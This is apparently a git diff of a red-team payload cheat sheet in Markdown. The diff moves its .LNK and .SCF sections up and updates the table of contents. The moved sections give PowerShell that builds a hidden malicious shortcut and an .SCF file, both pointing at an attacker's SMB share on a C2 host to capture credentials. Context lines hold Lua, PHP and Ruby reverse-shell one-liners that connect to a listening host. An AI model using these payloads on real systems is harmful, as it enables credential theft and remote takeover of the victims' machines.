@@ -4,6 +4,8 @@
 
 ## Table of Contents
 
+- [.LNK (Link) Files](#lnk-link-file)
+- [.SCF (Shell Command File) File](#scf-shell-command-file-file)
 - [An HTML Application (HTA)](#an-html-application-hta)
 - [Background Reverse Shells](#background-reverse-shells)
 - [Bad PDF](#bad-pdf)
@@ -19,7 +21,6 @@
 - [JavaScript Keylogger](#javascript-keylogger)
 - [JDWP](#jdwp)
 - [Lua Reverse Shell](#lua-reverse-shell)
-- [.LNK (Link) Files](#lnk-link-file)
 - [Macros](#macros)
 - [marco_pack](#macro-pack)
 - [Markdown Reverse Shell](#markdown-reverse-shell)
@@ -38,7 +39,6 @@
 - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
 - [Ruby Reverse Shell](#ruby-reverse-shell)
 - [ScareCrow](#scarecrow)
-- [.SCF (Shell Command File) File](#scf-shell-command-file-file)
 - [Spoofing Office Marco](#spoofing-office-macro)
 - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
 - [Visual Basic for Application (VBA)](#visual-basic-for-application-vba)
@@ -74,6 +74,52 @@
 | woodpecker | Log4j jndi injects the Payload generator | https://github.com/woodpecker-appstore/log4j-payload-generator |
 | ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
 | ysoserial.net | Deserialization payload generator for a variety of .NET formatters | https://github.com/pwntester/ysoserial.net |
+
+## .LNK (Link) File
+
+> https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
+
+### Malicious.lnk
+
+```c
+$path                      = "$([Environment]::GetFolderPath('Desktop'))\<FILE>.lnk"
+$wshell                    = New-Object -ComObject Wscript.Shell
+$shortcut                  = $wshell.CreateShortcut($path)
+
+$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
+
+$shortcut.TargetPath       = "cmd.exe"
+$shortcut.Arguments        = "/c explorer.exe Z:\PATH\TO\SHARE & \\<LHOST>\foobar" # Calls the SMB share of the responder instance on the C2 server
+$shortcut.WorkingDirectory = "C:"
+$shortcut.HotKey           = "CTRL+C"
+$shortcut.Description      = ""
+
+$shortcut.WindowStyle      = 7
+                           # 7 = Minimized window
+                           # 3 = Maximized window
+                           # 1 = Normal    window
+$shortcut.Save()
+
+(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
+```
+
+### Hide Target Folder
+
+```c
+C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
+```
+
+## .SCF (Shell Command File) File
+
+### Malicious.scf
+
+```c
+[Shell]
+Command=2
+Iconfile=\\<LHOST>\foobar
+[Taskbar]
+Command=ToggleDesktop
+```
 
 ## An HTML Application (HTA)
 
@@ -329,40 +375,6 @@ $ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamR
 
 ```c
 http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
-```
-
-## .LNK (Link) File
-
-> https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
-
-### Malicious.lnk
-
-```c
-$path                      = "$([Environment]::GetFolderPath('Desktop'))\<FILE>.lnk"
-$wshell                    = New-Object -ComObject Wscript.Shell
-$shortcut                  = $wshell.CreateShortcut($path)
-
-$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
-
-$shortcut.TargetPath       = "cmd.exe"
-$shortcut.Arguments        = "/c explorer.exe Z:\PATH\TO\SHARE & \\<LHOST>\foobar" # Calls the SMB share of the responder instance on the C2 server
-$shortcut.WorkingDirectory = "C:"
-$shortcut.HotKey           = "CTRL+C"
-$shortcut.Description      = ""
-
-$shortcut.WindowStyle      = 7
-                           # 7 = Minimized window
-                           # 3 = Maximized window
-                           # 1 = Normal    window
-$shortcut.Save()
-
-(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
-```
-
-### Hide Target Folder
-
-```c
-C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
 ```
 
 ## Macros
@@ -739,18 +751,6 @@ exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
 
 ```c
 $ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-```
-
-## .SCF (Shell Command File) File
-
-### Malicious.scf
-
-```c
-[Shell]
-Command=2
-Iconfile=\\<LHOST>\foobar
-[Taskbar]
-Command=ToggleDesktop
 ```
 
 ## Spoofing Office Marco
